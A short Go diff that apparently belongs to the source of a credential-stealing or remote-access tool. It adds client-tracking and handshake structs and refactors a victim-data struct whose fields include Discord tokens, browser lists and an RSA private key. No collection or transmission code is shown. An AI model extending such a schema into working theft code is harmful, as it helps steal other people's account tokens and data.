@@ -5,6 +5,20 @@ import (
 	"net"
 )
 
+type ConnectData struct {
+	UUID string `json:"uuid"`
+}
+
+type ClientListData struct {
+	UUID   string   `json:"uuid"`
+	Addr   net.Addr `json:"-"`
+	Socket net.Conn `json:"-"`
+}
+
+type HandshakeData struct {
+	PublicKey string `json:"public_key"`
+}
+
 type ClientData struct {
 	ComputerName    string `json:"computer_name"`
 	ComputerOS      string `json:"computer_os"`
@@ -33,9 +47,6 @@ type ClientData struct {
 
 	Webbrowsers   []string   `json:"webbrowsers"`
 	DiscordTokens [][]string `json:"discord_tokens"`
-
-	Addr   net.Addr `json:"-"`
-	Socket net.Conn `json:"-"`
 
 	PrivateKey rsa.PrivateKey `json:"private_key"`
 }
